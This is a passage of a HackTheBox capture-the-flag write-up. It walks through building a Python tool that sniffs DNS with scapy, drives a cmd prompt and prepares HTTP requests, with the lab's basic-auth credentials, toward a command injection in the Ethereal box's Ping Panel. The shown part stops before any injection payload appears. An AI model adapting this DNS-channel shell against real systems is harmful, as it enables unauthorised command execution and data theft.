@@ -1,0 +1,836 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" data-toc-skip="" itemprop="name headline">HTB: Ethereal Shell Development</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-ethereal">htb-ethereal</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#dns-c2">dns-c2</a> <a class="post-tag" href="/tags#python">python</a> <a class="post-tag" href="/tags#pdb">pdb</a> <a class="post-tag" href="/tags#python-cmd">python-cmd</a> <a class="post-tag" href="/tags#python-scapy">python-scapy</a> <a class="post-tag" href="/tags#injection">injection</a> <a class="post-tag" href="/tags#python-requests">python-requests</a> </span><br/><br/>
+<time class="dt-published" datetime="2019-03-09T13:46:00+00:00" itemprop="datePublished">Mar 9, 2019
+    </time>
+</p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<ul class="nav navbar-nav"><li><a href="/2019/03/09/htb-ethereal.html" style="color: #e6e6e6;">Ethereal Walkthrough</a></li><li><a href="/2019/03/09/htb-ethereal-pbox.html" style="color: #e6e6e6;">Password Box Brute</a></li><li><a href="/2019/03/09/htb-ethereal-shell.html" style="color: #e6e6e6;">Shell Development</a>
+<nav data-toggle="toc" id="toc"></nav></li><li><a href="/2019/03/15/htb-ethereal-cor.html" style="color: #e6e6e6;">COR Profilers</a></li>
+</ul>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<p><img alt="Ethereal Shell Cover image" src="https://0xdfimages.gitlab.io/img/ethereal-shell-cover.png" style="float: right;margin-right:50px; margin-left:50px">It would have been possible to get through the initial enumeration of Ethereal with just Burp Repeater and tcpdump, or using responder to read the DNS requests. But writing a shell is much more fun and good coding practice. I’ll develop around primary two modules from Python, scapy to listen for and process DNS packets, and cmd to create a shell user interface, with requests to make the http injections. In this post I’ll show how I built the shell step by step.</img></p>
+<h2 id="overview">Overview</h2>
+<p>There are two main components to this shell:</p>
+<ol>
+<li>Sending HTTP requests to do a command injection in the Ping Panel on Ethereal.</li>
+<li>Listening for DNS packets, parsing and processing them, and printing the result to the screen.</li>
+</ol>
+<p>I will use threading to run those at the same time from the same Python script.</p>
+<p>To build this, I’ll do testing both on Ethereal through injection and from a Windows VM. Both the Windows VM and my Kali VM have interfaces on 10.1.1.0/24, with the Windows at .153, and Kali at .41.</p>
+<h2 id="dns">DNS</h2>
+<h3 id="strategy">Strategy</h3>
+<p>The first thing I want to do is capture DNS packets. There are two ways to approach this. The first would be to do what m0noc did in <a href="https://www.youtube.com/watch?v=Egwp5zc5ZIM">his video</a> and get a copy of a Python DNS server, chop it down to what I need, and add some parsing. The alternative is to use <a href="https://scapy.net/">Scapy</a> inside Python to listen for the packets I want and parse them. I’m going to go with Scapy here.</p>
+<h3 id="getting-started">Getting Started</h3>
+<p>I’m going to start really simple. I just want to show that I can get a DNS packet.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python3
+</span>  <span class="mi">2</span> 
+  <span class="mi">3</span> <span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="mi">4</span> 
+  <span class="mi">5</span> <span class="k">def</span> <span class="nf">parse_packet</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+  <span class="mi">6</span>     <span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">summary</span><span class="p">())</span>
+  <span class="mi">7</span> 
+  <span class="mi">8</span> 
+  <span class="mi">9</span> <span class="nf">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sh">"</span><span class="s">src host 10.1.1.153 and udp port 53</span><span class="sh">"</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">parse_packet</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I’ve got a sniffer started listening on “eth0” since I’ll be testing from my local network. I’ll be filtering on the IP of my Windows host and udp port 53. And for each packet, I’ll send it to the function I defined above, <code class="language-plaintext highlighter-rouge">parse_packet</code>. At this point, that function just prints a summary of the packet.</p>
+<p>Here’s the script in action. I’ll run the following from my Windows VM:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span>nslookup 0xdf.xyz 10.1.1.41
+<span class="go">Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find 0xdf.xyz: No response from server
+</span></code></pre></div></div>
+<p>And I see:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ethereal_shell.py 
+<span class="go">Ether / IP / UDP / DNS Qry "b'41.1.1.10.in-addr.arpa.'" 
+Ether / IP / UDP / DNS Qry "b'0xdf.xyz.'" 
+Ether / IP / UDP / DNS Qry "b'0xdf.xyz.'" 
+</span></code></pre></div></div>
+<p>I had <code class="language-plaintext highlighter-rouge">tcpdump</code> running in a separate terminal window, and it showed the same packets, so I feel confident I’m getting all of them:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>tcpdump <span class="nt">-i</span> eth0 udp port 53
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+16:01:34.491316 IP 10.1.1.153.58862 &gt; kali.domain: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+16:01:34.499460 IP 10.1.1.153.58863 &gt; kali.domain: 2+ A? 0xdf.xyz. (26)
+16:01:34.500526 IP 10.1.1.153.58864 &gt; kali.domain: 3+ AAAA? 0xdf.xyz. (26)
+</span></code></pre></div></div>
+<h3 id="output">Output</h3>
+<p>I only really want one of these requests, so I’ll select on just getting the A record, which is <a href="https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml#dns-parameters-4">qtype == 1</a>. I also don’t want to print this summary, but rather the domain name. I’ll update <code class="language-plaintext highlighter-rouge">prase_packet</code>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">5</span> <span class="k">def</span> <span class="nf">parse_packet</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+  <span class="mi">6</span>     <span class="k">if</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qtype</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+  <span class="mi">7</span>         <span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
+</code></pre></div></div>
+<p>Now when I run this and send the same DNS query:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ethereal_shell.py
+<span class="go">0xdf.xyz.
+</span></code></pre></div></div>
+<h3 id="threading">Threading</h3>
+<p>I want this to run in the background while I’m doing other stuff. So I’m going to make this into a class, and have it subclass Thread. To do this, I’ll need to define a <code class="language-plaintext highlighter-rouge">run</code> method, which is what will run when the thread is started. I’ll have <code class="language-plaintext highlighter-rouge">run</code> just start the sniffer. I’ll also move <code class="language-plaintext highlighter-rouge">parse_packet</code> into the class, so I’ll need to pass it <code class="language-plaintext highlighter-rouge">self</code> as an argument, and call it by <code class="language-plaintext highlighter-rouge">self.parse_packet</code> in the <code class="language-plaintext highlighter-rouge">sniff</code> call.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python3
+</span>  <span class="mi">2</span> 
+  <span class="mi">3</span> <span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="mi">4</span> <span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+  <span class="mi">5</span> 
+  <span class="mi">6</span> 
+  <span class="mi">7</span> <span class="k">class</span> <span class="nc">dns_sniff</span><span class="p">(</span><span class="n">Thread</span><span class="p">):</span>
+  <span class="mi">8</span> 
+  <span class="mi">9</span>     <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">10</span>         <span class="nf">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sh">"</span><span class="s">src host 10.1.1.153 and udp port 53</span><span class="sh">"</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">parse_packet</span><span class="p">)</span>
+ <span class="mi">11</span> 
+ <span class="mi">12</span> 
+ <span class="mi">13</span>     <span class="k">def</span> <span class="nf">parse_packet</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
+ <span class="mi">14</span>         <span class="k">if</span> <span class="n">p</span><span class="p">.</span><span class="nf">haslayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">)</span> <span class="ow">and</span> <span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qtype</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+ <span class="mi">15</span>             <span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">getlayer</span><span class="p">(</span><span class="n">DNS</span><span class="p">).</span><span class="n">qd</span><span class="p">.</span><span class="n">qname</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
+ <span class="mi">16</span> 
+ <span class="mi">17</span> <span class="n">dns</span> <span class="o">=</span> <span class="nf">dns_sniff</span><span class="p">()</span>
+ <span class="mi">18</span> <span class="n">dns</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="additional-flexibility">Additional Flexibility</h3>
+<p>I’m going to add one more thing to make things more flexible so that I’m not hardcoding the interface and ip in multiple places. To do this, I’ll add an <code class="language-plaintext highlighter-rouge">__init__()</code> method to the class. Since I was subclassing <code class="language-plaintext highlighter-rouge">Thread</code>, it’s <code class="language-plaintext highlighter-rouge">__init__()</code> method was being called when I created a new object. Once I override the <code class="language-plaintext highlighter-rouge">__init__</code> method, it will no longer automatically call the init from Thread, and that will break things. I’ll fix that with a call to <code class="language-plaintext highlighter-rouge">super().__init()__()</code>.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">...</span>
+  <span class="mi">7</span> <span class="k">class</span> <span class="nc">dns_sniff</span><span class="p">(</span><span class="n">Thread</span><span class="p">):</span>
+  <span class="mi">8</span> 
+  <span class="mi">9</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">interface</span><span class="o">=</span><span class="sh">'</span><span class="s">tun0</span><span class="sh">'</span><span class="p">,</span> <span class="n">target_ip</span><span class="o">=</span><span class="sh">'</span><span class="s">10.10.10.106</span><span class="sh">'</span><span class="p">):</span>
+ <span class="mi">10</span>         <span class="n">self</span><span class="p">.</span><span class="n">interface</span> <span class="o">=</span> <span class="n">interface</span>
+ <span class="mi">11</span>         <span class="n">self</span><span class="p">.</span><span class="n">target_ip</span> <span class="o">=</span> <span class="n">target_ip</span>
+ <span class="mi">12</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">)</span>
+ <span class="mi">13</span> 
+ <span class="mi">14</span>     <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">15</span>         <span class="nf">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">interface</span><span class="p">,</span> <span class="nb">filter</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">src host </span><span class="si">{</span><span class="n">self</span><span class="p">.</span><span class="n">target_ip</span><span class="si">}</span><span class="s"> and udp port 53</span><span class="sh">"</span><span class="p">,</span> <span class="n">prn</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">parse_packet</span><span class="p">)</span>
+ <span class="p">...</span> 
+ <span class="mi">22</span> <span class="n">dns</span> <span class="o">=</span> <span class="nf">dns_sniff</span><span class="p">(</span><span class="n">interface</span><span class="o">=</span><span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span><span class="p">,</span> <span class="n">target_ip</span><span class="o">=</span><span class="sh">'</span><span class="s">10.1.1.153</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">23</span> <span class="n">dns</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+</code></pre></div></div>
+<h2 id="ethereal-ping-panel">Ethereal Ping Panel</h2>
+<h3 id="getting-started-1">Getting Started</h3>
+<p>I’m going to make use of the <code class="language-plaintext highlighter-rouge">cmd</code> python module for this shell. I’ll create a class and define the <code class="language-plaintext highlighter-rouge">default</code> method, which will process each time the user provides input. I’ll start with a simple implementation that just prints back the command. I’ll also include the <code class="language-plaintext highlighter-rouge">__init__()</code> function, as I’m going to be using it shortly.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python3
+</span>  <span class="mi">2</span> 
+  <span class="mi">3</span> <span class="kn">from</span> <span class="n">cmd</span> <span class="kn">import</span> <span class="n">Cmd</span>
+  <span class="mi">4</span> <span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="mi">5</span> <span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+  <span class="mi">6</span> 
+  <span class="mi">7</span> 
+  <span class="mi">8</span> <span class="k">class</span> <span class="nc">dns_sniff</span><span class="p">(</span><span class="n">Thread</span><span class="p">):</span>
+<span class="bp">...</span>
+ <span class="mi">25</span> <span class="k">class</span> <span class="nc">Terminal</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>
+ <span class="mi">26</span>     <span class="n">prompt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ethereal&gt; </span><span class="sh">"</span>
+ <span class="mi">27</span> 
+ <span class="mi">28</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">29</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">()</span>
+ <span class="mi">30</span> 
+ <span class="mi">31</span> 
+ <span class="mi">32</span>     <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">33</span>         <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Entered: </span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">34</span> 
+ <span class="mi">35</span> <span class="n">dns</span> <span class="o">=</span> <span class="nf">dns_sniff</span><span class="p">(</span><span class="n">interface</span><span class="o">=</span><span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span><span class="p">,</span> <span class="n">target_ip</span><span class="o">=</span><span class="sh">'</span><span class="s">10.1.1.153</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">36</span> <span class="n">dns</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+ <span class="mi">37</span> 
+ <span class="mi">38</span> <span class="n">term</span> <span class="o">=</span> <span class="nc">Terminal</span><span class="p">()</span>
+ <span class="mi">39</span> <span class="n">term</span><span class="p">.</span><span class="nf">cmdloop</span><span class="p">()</span>
+</code></pre></div></div>
+<p>On running this, it works as expected, both echoing commands and receiving DNS:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ethereal_shell.py
+<span class="gp">ethereal&gt;</span><span class="w"> </span><span class="nb">test</span>
+<span class="go">Entered: test
+</span><span class="gp">ethereal&gt;</span><span class="w"> </span>this is a <span class="nb">test</span>
+<span class="go">Entered: this is a test
+</span><span class="gp">ethereal&gt;</span><span class="w"> </span>0xdf.xyz.             &lt;<span class="nt">--</span> this came from a manual nslookup from my VM
+</code></pre></div></div>
+<p>Receiving DNS at this point looks awkward because it sits where my input should be. I’ll address that later.</p>
+<h3 id="interact-with-page">Interact With Page</h3>
+<p>Now I need to build in interaction with the Ping Panel. If I go into burp, and look at a POST to the page, I’ll notice a few things:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">ethereal.htb:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://ethereal.htb:8080/</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">289</span>
+<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic YWxhbjohQzQxNG0xN3k1N3IxazNzNGc0MW4h</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+
+__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjhkZP0D71BrdSC2r6xNMsSvx5TLwDHEW3R5Nu77TRePe554&amp;__VIEWSTATEGENERATOR=CA0B0334&amp;__EVENTVALIDATION=%2FwEdAAOSdp36r9zrz%2Bs0ovq%2FbSa14CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN8kvJMME1vv%2Bx5EO%2Fp9qTNUHD5bMT5kaL78WVMNT%2BVpZw%3D%3D&amp;search=127.0.0.1&amp;ctl02=
+</code></pre></div></div>
+<p>I need the http basic auth, and I need to get a handful of parameters for the POST request.</p>
+<h4 id="basic-auth">Basic Auth</h4>
+<p>I’ll start with the basic auth. I’ll be using the <code class="language-plaintext highlighter-rouge">requests</code> module to make HTTP requests, so I’ll follow the guidance from the <a href="http://docs.python-requests.org/en/master/user/authentication/#basic-authentication">documentation</a> for using basic auth. I’m going to build this initial query in the <code class="language-plaintext highlighter-rouge">__init__</code> method, as that is where it will eventually end up. To start, I’ll have it fetch the page and print it on init:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="mi">1</span> <span class="c1">#!/usr/bin/env python3
+</span>  <span class="mi">2</span> 
+  <span class="mi">3</span> <span class="kn">import</span> <span class="n">requests</span>
+  <span class="mi">4</span> <span class="kn">from</span> <span class="n">cmd</span> <span class="kn">import</span> <span class="n">Cmd</span>
+  <span class="mi">5</span> <span class="kn">from</span> <span class="n">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+  <span class="mi">6</span> <span class="kn">from</span> <span class="n">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+  <span class="mi">7</span> <span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+  <span class="mi">8</span> 
+  <span class="mi">9</span> 
+ <span class="mi">10</span> <span class="k">class</span> <span class="nc">dns_sniff</span><span class="p">(</span><span class="n">Thread</span><span class="p">):</span>
+<span class="bp">...</span>
+ <span class="mi">27</span> <span class="k">class</span> <span class="nc">Terminal</span><span class="p">(</span><span class="n">Cmd</span><span class="p">):</span>
+ <span class="mi">28</span>     <span class="n">prompt</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ethereal&gt; </span><span class="sh">"</span>
+ <span class="mi">29</span>     
+ <span class="mi">30</span> 
+ <span class="mi">31</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">32</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">()</span>
+ <span class="mi">33</span>         <span class="n">auth</span> <span class="o">=</span> <span class="nc">HTTPBasicAuth</span><span class="p">(</span><span class="sh">'</span><span class="s">alan</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">!C414m17y57r1k3s4g41n!</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">34</span>         <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">)</span>
+ <span class="mi">35</span>         <span class="nf">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+ <span class="mi">36</span> 
+ <span class="mi">37</span> 
+ <span class="mi">38</span>     <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">39</span>         <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Entered: </span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">40</span> 
+ <span class="mi">41</span> 
+ <span class="mi">42</span> <span class="n">dns</span> <span class="o">=</span> <span class="nf">dns_sniff</span><span class="p">(</span><span class="n">interface</span><span class="o">=</span><span class="sh">'</span><span class="s">eth0</span><span class="sh">'</span><span class="p">,</span> <span class="n">target_ip</span><span class="o">=</span><span class="sh">'</span><span class="s">10.1.1.153</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">43</span> <span class="n">dns</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
+ <span class="mi">44</span> 
+ <span class="mi">45</span> <span class="n">term</span> <span class="o">=</span> <span class="nc">Terminal</span><span class="p">()</span>
+ <span class="mi">46</span> <span class="n">term</span><span class="p">.</span><span class="nf">cmdloop</span><span class="p">()</span>
+</code></pre></div></div>
+<p>On running, it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ethereal_shell.py
+<span class="go">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en" &gt;
+&lt;head&gt;
+  &lt;meta charset="UTF-8"&gt;
+  &lt;title&gt;Admin Console&lt;/title&gt;
+    &lt;link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"&gt;
+      &lt;link rel="stylesheet" href="css/style.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div class="body"&gt;
+        &lt;h1&gt;Test Connection&lt;br/&gt;&lt;/h1&gt;
+       &lt;div class="wrapper"&gt;
+        &lt;form method="post" action="./" id="ctl01"&gt;
+&lt;input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz" /&gt;
+&lt;input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="CA0B0334" /&gt;
+&lt;input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAOFr9TrHWt+2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN9kKYZ9rDh9NVw3pnVFLEyhi/zP9ndEQ4bcuvdL5zBCfg==" /&gt;
+            &lt;input name="search" id="search" class="search" type="text" /&gt;
+            &lt;input type="submit" name="ctl02" value="" class="submit" type="submit" value=" " /&gt;
+        &lt;/form&gt;
+        &lt;/div&gt;
+&lt;/div&gt;
+&lt;h2 id="l1"&gt;&lt;font face="Verdana"&gt;Click to test connection&lt;/font&gt;&lt;/h2&gt;
+  &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt;
+    &lt;script  src="js/index.js"&gt;&lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+
+
+</span><span class="gp">ethereal&gt;</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="get-params">Get Params</h4>
+<p>Now that I can fetch the page, I need to get the parameters to submit. I submitted a handful of legitimate ips to the panel manually, and checked in burp, and the various hidden parameters did not change over a short period of time. That means I can save them in the <code class="language-plaintext highlighter-rouge">__init__()</code> call, and then use them on repeated POSTs.</p>
+<p>I’ll use <a href="https://www.crummy.com/software/BeautifulSoup/">BeautifulSoup</a> to parse the page. I can install with <code class="language-plaintext highlighter-rouge">python3 -m pip install bs4</code>. To  figure out what exactly I want to collect, I’ll use the Python Debugger, <code class="language-plaintext highlighter-rouge">pdb</code>. I’ll add <code class="language-plaintext highlighter-rouge">from bs4 import BeautifulSoup</code> to my imports (bumping all the line numbers from above up one), and then call the script with a breakpoint at <code class="language-plaintext highlighter-rouge">print(resp.text)</code> (now line 36). I can pass commands into pdb from the command line with the <code class="language-plaintext highlighter-rouge">-c</code> switch, so I’ll have my first <code class="language-plaintext highlighter-rouge">-c</code> set my break point and a second tell it to run on start to that break point:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>python3 <span class="nt">-mpdb</span> <span class="nt">-c</span> <span class="s2">"b 36"</span> <span class="nt">-c</span> c ./ethereal_shell.py 
+<span class="go">Breakpoint 1 at /media/sf_CTFs/hackthebox/ethereal-10.10.10.106/ethereal_shell.py:36
+&gt; /media/sf_CTFs/hackthebox/ethereal-10.10.10.106/ethereal_shell.py(36)__init__()
+-&gt; print(resp.text)
+</span><span class="gp">(Pdb)</span><span class="w"> 
+</span></code></pre></div></div>
+<p>Now I can parse the page in BS, and then search it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(Pdb)</span><span class="w"> </span><span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Now I can search and find the fields I’m looking for. I’ll start by looking at all <code class="language-plaintext highlighter-rouge">inputs</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(Pdb)</span><span class="w"> </span><span class="n">soup</span><span class="p">.</span><span class="nf">find_all</span><span class="p">(</span><span class="sh">'</span><span class="s">input</span><span class="sh">'</span><span class="p">)</span>
+<span class="go">[&lt;input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz"/&gt;, &lt;input id="__VIEWSTATEGENERATOR" name="__VIEWSTATEGENERATOR" type="hidden" value="CA0B0334"/&gt;, &lt;input id="__EVENTVALIDATION" name="__EVENTVALIDATION" type="hidden" value="/wEdAAOFr9TrHWt+2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN9kKYZ9rDh9NVw3pnVFLEyhi/zP9ndEQ4bcuvdL5zBCfg=="/&gt;, &lt;input class="search" id="search" name="search" type="text"/&gt;, &lt;input class="submit" name="ctl02" type="submit" value=" "/&gt;]
+</span></code></pre></div></div>
+<p>I can actually use the <code class="language-plaintext highlighter-rouge">find</code> function to get an <code class="language-plaintext highlighter-rouge">input</code> with an <code class="language-plaintext highlighter-rouge">id</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(Pdb)</span><span class="w"> </span><span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATE</span><span class="sh">"</span><span class="p">)</span>
+<span class="go">&lt;input id="__VIEWSTATE" name="__VIEWSTATE" type="hidden" value="/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz"/&gt;
+</span></code></pre></div></div>
+<p>Now I want to get the value from that:</p>
